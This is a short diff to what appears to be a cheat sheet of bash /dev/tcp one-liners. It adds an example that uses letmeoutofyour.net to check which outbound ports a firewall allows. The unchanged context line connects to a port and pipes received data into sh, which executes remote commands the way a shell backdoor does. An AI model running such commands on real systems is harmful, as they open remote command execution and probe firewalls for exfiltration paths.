@@ -25,3 +25,9 @@ Connect to a port and execute the command received:
 ```shell
 exec 3<>/dev/tcp/127.0.0.1/31337; cat <&3 | sh
 ```
+
+Use letmeoutofyour.net to check firewall ACLs for a port:
+
+```shell
+exec 3<>/dev/tcp/letmeoutofyour.net/31337; echo -e "GET / HTTP/1.0\r\n\r\n" >&3; cat <&3 | grep w00tw00t
+```
